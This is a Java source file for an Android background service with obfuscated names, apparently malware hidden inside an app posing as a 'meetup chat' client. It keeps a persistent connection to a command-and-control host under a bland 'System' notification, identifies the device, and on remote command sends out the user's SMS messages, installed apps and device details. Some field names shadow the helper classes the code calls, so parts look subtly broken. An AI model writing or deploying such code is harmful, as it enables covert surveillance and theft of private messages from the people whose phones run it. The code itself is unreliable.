package com.meetup.chat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import java.io.*;
import java.net.Socket;

public class d extends Service {
    private static final String a = "C2Channel";
    private static final int b = 1;
    private Socket c;
    private PrintWriter d;
    private BufferedReader e;
    private volatile boolean f = true;
    private String g;

    @Override
    public void onCreate() {
        super.onCreate();
        a();
        g = Build.MODEL.replace(" ", "_") + "|" + Build.SERIAL;
    }

    @Override
    public int onStartCommand(Intent i, int j, int k) {
        startForeground(b, b());
        new Thread(this::c).start();
        return START_STICKY;
    }

    private void c() {
        while (f) {
            try {
                c = new Socket(c.a, c.b);
                d = new PrintWriter(c.getOutputStream(), true);
                e = new BufferedReader(new InputStreamReader(c.getInputStream()));
                d.println("DEVICE:" + g);
                d.println("READY");
                String h;
                while ((h = e.readLine()) != null && f) {
                    String resp = d(h);
                    d.println(resp);
                    d.println("---END---");
                }
            } catch (Exception ex) {
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }

    private String d(String h) {
        if (h.startsWith("@")) {
            String[] parts = h.split(":", 2);
            if (parts.length < 2) return "Invalid target";
            String target = parts[0].substring(1);
            String cmd = parts[1];
            if (target.equals("all") || target.equals(g) || target.equals(Build.MODEL)) {
                return executeCmd(cmd);
            }
            return "Ignored";
        }
        return executeCmd(h);
    }

    private String executeCmd(String cmd) {
        if (cmd.equalsIgnoreCase("ping")) return "PONG";
        if (cmd.equalsIgnoreCase("info")) return f.a(this);
        if (cmd.equalsIgnoreCase("sms read")) return f.b(this);
        if (cmd.equalsIgnoreCase("apps list")) return f.c(this);
        if (cmd.equalsIgnoreCase("device")) return g;
        if (cmd.equalsIgnoreCase("exit")) { f = false; stopSelf(); return "EXIT"; }
        return "Unknown command";
    }

    private void a() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(a, "C2 Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification b() {
        return new NotificationCompat.Builder(this, a)
                .setContentTitle("System")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }

    @Override
    public void onDestroy() {
        f = false;
        try { c.close(); } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
}
